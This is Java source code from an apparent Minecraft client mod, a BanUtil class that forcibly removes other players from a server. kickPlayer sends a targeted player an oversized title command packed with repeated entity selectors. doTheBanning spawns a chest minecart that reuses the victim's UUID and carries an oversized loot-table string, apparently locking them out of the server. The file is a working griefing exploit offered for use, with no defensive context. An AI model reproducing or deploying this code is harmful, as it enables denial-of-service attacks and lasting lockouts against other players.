package me.allink.deviousmod.util;

import com.google.gson.Gson;
import me.allink.deviousmod.client.DeviousModClient;
import me.allink.deviousmod.types.ashcon.AshconPlayer;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayerInteractionManager;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3i;

import java.net.URI;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.Timer;
import java.util.TimerTask;
import java.util.UUID;
import java.util.concurrent.CompletableFuture;

public class BanUtil {
    private final CommandBlockUtil commandBlockUtil;

    public BanUtil(CommandBlockUtil commandBlockUtil) {
        this.commandBlockUtil = commandBlockUtil;
    }

    /**
     * Kick the requested player from the server (requries OP & command blocks)
     *
     * @param identifier Who to kick
     */
    public void kickPlayer(String identifier) {
        commandBlockUtil.placeRepeating(String.format("/execute as %s run title @s title [{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"},{\"nbt\":\"\",\"entity\":\"@e[limit=20]\"}]", identifier));
    }

    private void doTheBanning(UUID uuid) {
        MinecraftClient client = MinecraftClient.getInstance();
        ClientPlayerInteractionManager interactionManager = client.interactionManager;
        int previousSlot = client.player.getInventory().selectedSlot;
        NbtCompound entityTag = new NbtCompound();
        String devious = "devious";
        entityTag.putString("id", "minecraft:chest_minecart");
        entityTag.putString("LootTable", devious.repeat((256 / devious.length()) + 1));
        entityTag.putUuid("UUID", uuid);
        entityTag.putByte("CustomDisplayTile", (byte) 1);
        entityTag.putInt("DisplayOffset", 6);
        NbtCompound displayState = new NbtCompound();
        displayState.putString("Name", "minecraft:tnt");
        entityTag.put("DisplayState", displayState);
        NbtCompound rootNbt = new NbtCompound();
        rootNbt.putString("id", "minecraft:cat_spawn_egg");
        NbtCompound tag = new NbtCompound();
        tag.put("EntityTag", entityTag);
        rootNbt.put("tag", tag);
        rootNbt.putByte("Count", (byte) 1);
        ItemStack itemStack = ItemStack.fromNbt(rootNbt);
        System.out.println(rootNbt);
        interactionManager.clickCreativeStack(itemStack, 37);
        Timer t = new Timer();
        t.schedule(new TimerTask() {
            @Override
            public void run() {
                client.player.getInventory().selectedSlot = 1;
                interactionManager.interactBlock(client.player, client.world, Hand.MAIN_HAND, new BlockHitResult(client.player.getPos().subtract(0, 2, 0), Direction.NORTH, client.player.getBlockPos().subtract(new Vec3i(0, 2, 0)), false));
                interactionManager.clickCreativeStack(ItemStack.EMPTY, 37);
                client.player.getInventory().selectedSlot = previousSlot;
            }
        }, 110L + 55L);
    }


    /**
     * Ban the requested player from the server (requries OP & command blocks)
     *
     * @param identifier Who to ban
     */
    public void banPlayer(String identifier) {
        this.kickPlayer(identifier);
        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                if (DeviousModClient.uuidCache.containsKey(identifier)) {
                    doTheBanning(DeviousModClient.uuidCache.get(identifier));
                } else {
                    if (identifier.contains("-")) { // is uuid
                        doTheBanning(UUID.fromString(identifier));
                    } else {
                        if (DeviousModClient.isOffline) {
                            doTheBanning(UUID.nameUUIDFromBytes(String.format("OfflinePlayer:%s", identifier).getBytes()));
                        } else {
                            Thread t = new Thread(() -> {
                                HttpRequest request = HttpRequest.newBuilder(URI.create("https://api.ashcon.app/mojang/v2/user/" + identifier))
                                        .GET()
                                        .build();

                                CompletableFuture<HttpResponse<String>> responseFuture = DeviousModClient.CLIENT.sendAsync(request, HttpResponse.BodyHandlers.ofString());
                                HttpResponse<String> response;
                                try {
                                    response = responseFuture.get();

                                    AshconPlayer player = new Gson().fromJson(response.body(), AshconPlayer.class);
                                    doTheBanning(UUID.fromString(player.uuid));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                            });
                            t.start();
                        }
                    }
                }
            }
        }, 150 + 55L);
    }
}
